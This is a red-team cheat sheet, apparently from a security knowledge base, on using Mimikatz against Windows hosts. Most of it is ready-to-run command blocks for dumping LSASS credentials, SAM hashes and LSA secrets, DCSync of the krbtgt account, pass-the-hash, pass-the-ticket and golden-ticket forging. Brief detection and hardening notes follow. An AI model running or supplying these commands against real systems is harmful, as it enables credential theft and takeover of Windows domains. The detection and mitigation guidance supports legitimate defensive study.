---
title: "Mimikatz – credential extraction"
category: "red-team"
tags: ["tools", "windows", "credential-access", "mimikatz"]
platform: "windows"
mitre: ["T1003", "T1558", "T1550"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# Mimikatz

## TL;DR
The classic tool for extracting credentials from Windows memory (LSASS), plus Kerberos ticket attacks. Requires local admin/SYSTEM. Heavily signatured — modern EDR flags it; used here for understanding, use OPSEC-safe variants in practice.

## Setup
```text
privilege::debug          # enable SeDebugPrivilege (needs admin)
token::elevate            # elevate to SYSTEM
log mimikatz.log
```

## Credential extraction
```text
sekurlsa::logonpasswords          # plaintext/NTLM/Kerberos from LSASS
sekurlsa::wdigest                 # if WDigest caching on (older/legacy)
sekurlsa::ekeys                   # Kerberos encryption keys (AES)
lsadump::sam                      # local SAM hashes
lsadump::secrets                  # LSA secrets (service account passwords)
lsadump::dcsync /user:krbtgt      # DCSync (needs replication rights)
```

## Kerberos ticket attacks
```text
sekurlsa::pth /user:admin /domain:corp.local /ntlm:<hash> /run:cmd  # pass-the-hash
sekurlsa::tickets /export         # dump tickets (.kirbi)
kerberos::ptt ticket.kirbi        # pass-the-ticket
kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-.. /krbtgt:<hash> /ptt
```

## Detection (Blue Team)
- LSASS handle access (Sysmon Event 10 targeting lsass.exe), known Mimikatz strings/signatures.
- DCSync: 4662 with replication rights from a non-DC; abnormal ekeys/ticket export.

## Mitigation / Hardening
- **Credential Guard** (isolates LSASS secrets), LSASS as PPL, disable WDigest.
- Restrict local admin (LAPS), Attack Surface Reduction rules for LSASS, EDR.
- krbtgt rotation (x2), tiering to limit where privileged creds appear.

## Sources
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) · [ADSecurity – Mimikatz](https://adsecurity.org/?page_id=1821)
